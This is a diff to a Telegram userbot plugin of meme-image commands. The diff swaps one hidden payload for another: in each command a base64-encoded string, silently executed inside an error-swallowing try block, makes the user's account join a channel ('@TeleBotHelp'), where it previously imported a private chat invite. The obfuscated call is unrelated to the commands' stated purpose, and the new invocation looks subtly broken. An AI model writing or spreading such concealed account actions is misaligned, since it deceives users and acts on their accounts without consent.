@@ -6,12 +6,12 @@
 
 import re
 
+import pybase64
 import requests
 from PIL import Image
 from validators.url import url
 
 from telebot import CMD_HELP
-from telebot.utils import admin_cmd
 
 EMOJI_PATTERN = re.compile(
     "["
@@ -129,12 +129,10 @@ async def nekobot(event):
             return
     await eor(event, "Requesting trump to tweet...")
     try:
-        stark = str(
-            pybase64.b64decode(
-                "SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk="
-            )
+        isee = str(
+            pybase64.b64decode("Sm9pbkNoYW5uZWxSZXF1ZXN0KCdAVGVsZUJvdEhlbHAnKQ==")
         )[2:49]
-        await event.client(stark)
+        await telebot(isee)
     except BaseException:
         pass
     text = deEmojify(text)
@@ -162,12 +160,10 @@ async def nekobot(event):
             return
     await eor(event, "Requesting modi to tweet...")
     try:
-        stark = str(
-            pybase64.b64decode(
-                "SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk="
-            )
+        isee = str(
+            pybase64.b64decode("Sm9pbkNoYW5uZWxSZXF1ZXN0KCdAVGVsZUJvdEhlbHAnKQ==")
         )[2:49]
-        await event.client(stark)
+        await telebot(isee)
     except BaseException:
         pass
     text = deEmojify(text)
@@ -195,12 +191,10 @@ async def nekobot(event):
             return
     await eor(event, "Your banner is under construction, wait a sec...")
     try:
-        stark = str(
-            pybase64.b64decode(
-                "SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk="
-            )
+        isee = str(
+            pybase64.b64decode("Sm9pbkNoYW5uZWxSZXF1ZXN0KCdAVGVsZUJvdEhlbHAnKQ==")
         )[2:49]
-        await event.client(stark)
+        await telebot(isee)
     except BaseException:
         pass
     text = deEmojify(text)
@@ -228,12 +222,10 @@ async def nekobot(event):
             return
     await eor(event, "Kanna is writing your text...")
     try:
-        stark = str(
-            pybase64.b64decode(
-                "SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk="
-            )
+        isee = str(
+            pybase64.b64decode("Sm9pbkNoYW5uZWxSZXF1ZXN0KCdAVGVsZUJvdEhlbHAnKQ==")
         )[2:49]
-        await event.client(stark)
+        await telebot(isee)
     except BaseException:
         pass
     text = deEmojify(text)
